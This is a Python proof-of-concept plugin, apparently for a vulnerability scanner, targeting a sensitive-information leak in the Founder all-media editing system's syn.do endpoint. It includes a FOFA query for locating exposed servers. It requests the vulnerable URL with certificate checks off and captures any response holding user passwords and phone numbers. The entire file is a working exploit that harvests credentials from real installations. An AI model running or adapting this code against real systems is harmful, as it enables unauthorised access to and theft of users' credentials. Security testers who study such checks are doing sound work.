#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s?__biz=MzkwNzYzNTkzNA==&mid=2247486203&idx=1&sn=c53df5eda7399e1abdba1e654a5dc015',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '北大方正全媒体采编系统 syn.do接口处敏感信息泄露',

      'level'     :   'medium',

      'FOFA'      :   'app="FOUNDER-全媒体采编系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/6/20',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/newsedit/assess/syn.do?type=org'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'userpassword.*?handesetnumber.*?/handesetnumber',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret